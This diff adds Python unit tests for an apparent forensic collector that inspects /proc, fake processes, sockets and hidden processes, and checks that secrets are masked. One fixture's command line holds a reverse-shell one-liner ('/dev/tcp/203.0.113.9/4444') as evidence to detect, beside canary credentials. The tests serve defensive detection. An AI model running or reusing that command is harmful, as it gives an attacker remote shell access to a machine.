@@ -3641,6 +3641,191 @@ class UnusualFilesTests(FixtureRoot):
         self.assertIn("hidden", flags("f", "/.cache/f"))
 
 
+def fake_process(
+    root,
+    pid,
+    ppid=1,
+    comm="app",
+    cmdline=b"app\0",
+    environ=b"",
+    exe="/usr/bin/app",
+    fds=(),
+    threads=(),
+    uid=0,
+):
+    """A /proc/<pid> directory as the kernel lays it out (just what the
+    collector reads)."""
+    base = Path(root, "proc", str(pid))
+    (base / "fd").mkdir(parents=True)
+    (base / "task").mkdir()
+    for tid in (pid,) + tuple(threads):
+        (base / "task" / str(tid)).mkdir()
+    fields = (
+        ["S", str(ppid)]
+        + ["0"] * 9
+        + ["150", "50"]
+        + ["0"] * 4
+        + [str(1 + len(threads)), "0", "1000"]
+    )
+    (base / "stat").write_bytes(f"{pid} ({comm}) ".encode() + " ".join(fields).encode() + b"\n")
+    (base / "status").write_bytes(
+        f"Name:\t{comm}\nTgid:\t{pid}\nUid:\t{uid}\t{uid}\t{uid}\t{uid}\nGid:\t0\t0\t0\t0\n".encode()
+    )
+    (base / "cmdline").write_bytes(cmdline)
+    (base / "environ").write_bytes(environ)
+    (base / "cgroup").write_bytes(b"0::/system.slice/app.service\n")
+    if exe is not None:
+        os.symlink(exe, base / "exe")
+    os.symlink("/srv/app", base / "cwd")
+    os.symlink("/", base / "root")
+    for number, target in enumerate(fds):
+        os.symlink(target, base / "fd" / str(number))
+    return base
+
+
+def proc_fixture(root):
+    Path(root, "proc/sys/kernel").mkdir(parents=True)
+    Path(root, "proc/sys/kernel/pid_max").write_bytes(b"64\n")
+    Path(root, "proc/stat").write_bytes(b"cpu 1 2 3\nbtime 1790000000\n")
+    Path(root, "proc/loadavg").write_bytes(b"0.1 0.2 0.3 1/6 40\n")
+    Path(root, "proc/net").mkdir()
+    Path(root, "proc/net/tcp").write_bytes(
+        b"  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt"
+        b"   uid  timeout inode\n"
+        b"   0: 00000000:115C 00000000:0000 0A 00000000:00000000 00:00000000 00000000"
+        b"     0        0 4242 1\n"
+        b"   1: 0100007F:8F3A 097100CB:115C 01 00000000:00000000 00:00000000 00000000"
+        b"  1000        0 4343 1\n"
+    )
+    Path(root, "proc/net/tcp6").write_bytes(
+        b"  sl  local_address                         remote_address                        st\n"
+        b"   0: 00000000000000000000000001000000:0016 00000000000000000000000000000000:0000 0A"
+        b" 00000000:00000000 00:00000000 00000000     0        0 4444 1\n"
+    )
+
+
+class ProcessTests(FixtureRoot):
+    def run_processes(self, hide=(), hide_first_time=()):
+        from unittest import mock
+
+        collector = load_collector(self.root)
+        real_listdir = os.listdir
+        proc = os.path.join(self.root, "proc")
+        calls = []
+
+        def listing(target):
+            names = real_listdir(target)
+            if os.path.normpath(str(target)) == proc:
+                hidden = {str(p) for p in hide}
+                if not calls:
+                    hidden |= {str(p) for p in hide_first_time}
+                calls.append(target)
+                names = [n for n in names if n not in hidden]
+            return names
+
+        out = io.BytesIO()
+        with mock.patch.object(collector.os, "listdir", side_effect=listing):
+            collector.main(settings(["processes"]), out=out)
+        return [json.loads(x) for x in gzip.decompress(out.getvalue()).splitlines()]
+
+    def fixture(self):
+        proc_fixture(self.root)
+        fake_process(self.root, 1, ppid=0, comm="systemd", cmdline=b"/sbin/init\0")
+        fake_process(
+            self.root,
+            23,
+            comm="kworker",
+            cmdline=b"bash\0-c\0mysql -pCanaryProcPass db;"
+            b" bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\0",
+            environ=b"HOME=/root\0AWS_SECRET_ACCESS_KEY=CanaryEnvValue\0LD_PRELOAD=/tmp/.l.so\0",
+            exe="/tmp/.x/kworker (deleted)",
+            fds=(
+                "socket:[4343]",
+                "pipe:[9]",
+                "/tmp/.x/log (deleted)",
+                "/etc/hosts",
+                "/memfd:p (deleted)",
+            ),
+            threads=(24,),
+            uid=33,
+        )
+        fake_process(self.root, 31, comm="sshd", exe="/usr/sbin/sshd", fds=("socket:[4242]",))
+        fake_process(self.root, 2, ppid=0, comm="kthreadd", cmdline=b"", exe=None)
+
+    def test_processes_sockets_and_masking(self):
+        self.fixture()
+        records = self.run_processes()
+        procs = {r["pid"]: r for r in records_named(records, "process")}
+        bad = procs[23]
+        self.assertTrue(bad["exe_deleted"])
+        self.assertEqual(bad["uids"], [33, 33, 33, 33])
+        self.assertEqual((bad["ppid"], bad["threads"], bad["cpu_seconds"]), (1, 2, 2.0))
+        self.assertIn("/dev/tcp/203.0.113.9/4444", bad["cmdline"])  # the evidence stays
+        self.assertNotIn("CanaryProcPass", json.dumps(records))  # the secret doesn't
+        self.assertEqual(bad["loader_environment"], {"LD_PRELOAD": "/tmp/.l.so"})
+        self.assertNotIn("CanaryEnvValue", json.dumps(records))
+        self.assertEqual(bad["fds"], {"socket": 1, "pipe": 1, "file": 2, "memfd": 1})
+        self.assertEqual(
+            [f["target"] for f in bad["open_files"]],
+            ["/tmp/.x/log (deleted)", "/memfd:p (deleted)"],
+        )
+        self.assertEqual(bad["std_streams"]["0"], {"kind": "socket", "inode": "4343"})
+        self.assertEqual(bad["std_streams"]["1"], {"kind": "pipe"})
+        self.assertTrue(procs[2]["kernel_thread"])
+        sockets = {r["inode"]: r for r in records_named(records, "socket")}
+        self.assertEqual(sockets["4242"]["local"], ["0.0.0.0", 4444])  # noqa: S104 - parsed, not bound
+        self.assertEqual(sockets["4242"]["state"], "listen")
+        self.assertEqual(sockets["4242"]["pids"], [31])
+        self.assertEqual(sockets["4343"]["remote"], ["203.0.113.9", 4444])
+        self.assertEqual(sockets["4343"]["pids"], [23])
+        self.assertEqual(sockets["4444"]["local"], ["::1", 22])
+        summary = records_named(records, "process_summary")[0]
+        self.assertEqual(summary["kernel_tasks"], 6)
+        self.assertTrue(summary["probe"]["complete"])
+        self.assertEqual(records_named(records, "hidden_process"), [])  # thread 24 isn't one
+        self.assertEqual(records[-1]["modules"]["processes"]["status"], "ok")
+
+    def test_a_process_hidden_from_the_listing_is_found(self):
+        self.fixture()
+        fake_process(self.root, 40, comm="hidden", cmdline=b"/dev/shm/.h\0")
+        records = self.run_processes(hide=(40,))
+        hidden = records_named(records, "hidden_process")
+        self.assertEqual([h["pid"] for h in hidden], [40])
+        self.assertTrue(hidden[0]["hidden_from_listing"])
+        self.assertEqual(records_named(records, "process_summary")[0]["probe"]["hidden"], 1)
+
+    def thread_entry(self, tid, tgid):
+        # The kernel answers /proc/<tid> for a thread but never lists it.
+        base = Path(self.root, "proc", str(tid))
+        base.mkdir(parents=True)
+        (base / "status").write_bytes(f"Name:\tw\nTgid:\t{tgid}\n".encode())
+
+    def test_threads_are_not_hidden_processes(self):
+        self.fixture()
+        self.thread_entry(24, 23)  # listed as a task of 23
+        self.thread_entry(25, 23)  # not even in 23's task list (started meanwhile)
+        records = self.run_processes(hide=(24, 25))
+        self.assertEqual(records_named(records, "hidden_process"), [])
+
+    def test_a_process_started_after_the_listing_is_not_hidden(self):
+        self.fixture()
+        fake_process(self.root, 50, comm="new")
+        records = self.run_processes(hide_first_time=(50,))
+        self.assertEqual(records_named(records, "hidden_process"), [])
+
+    def test_a_process_gone_mid_run_is_counted_not_an_error(self):
+        self.fixture()
+        shutil.rmtree(Path(self.root, "proc/31"))
+        Path(self.root, "proc/31").mkdir()  # listed, but its files are gone
+        records = self.run_processes()
+        self.assertEqual(records_named(records, "process_summary")[0]["counts"]["gone"], 1)
+
+    def test_address_parsing(self):
+        address = load_collector(self.root)._address
+        self.assertEqual(address("0100007F:0016"), ("127.0.0.1", 22))
+        self.assertEqual(address("00000000000000000000000001000000:01BB"), ("::1", 443))
+
+
 CANARIES = {
     "hash": "$6$CanarySalt$" + "H" * 86,
     "gecos": "CanaryGecosName",
@@ -3667,6 +3852,8 @@ CANARIES = {
     "typed": "CanaryTypedPass1",  # a bare password typed as a user name
     "tmpbody": "CanaryTmpFileBody",
     "tmpname": "CanaryTmpFileName",
+    "proccmd": "CanaryProcCommand",
+    "procenv": "CanaryProcEnvironment",
 }
 
 
@@ -4029,6 +4216,16 @@ class CanaryTests(FixtureRoot):
         self.write(f"tmp/token={c['tmpname']}", b"x")
         os.link(Path(self.root, "home/jch/.bash_history"), Path(self.root, "tmp/h"))
         self.write("var/www/site/shell.php", f"<?php // {c['tmpbody']}".encode())
+        # A process: a password on its command line, secrets in its
+        # environment beside the one loader variable that is sent.
+        proc_fixture(self.root)
+        fake_process(
+            self.root,
+            7,
+            cmdline=f"mysql\0-p{c['proccmd']}\0".encode(),
+            environ=f"API_KEY={c['procenv']}\0LD_PRELOAD=/x.so\0".encode(),
+            comm="app",
+        )
         self.write("var/crash/_usr_bin_x.crash", c["core"].encode())
         # Persistence: an at job's environment and output, crontab and unit
         # secrets, and start-up files and units in homes (hashes only).
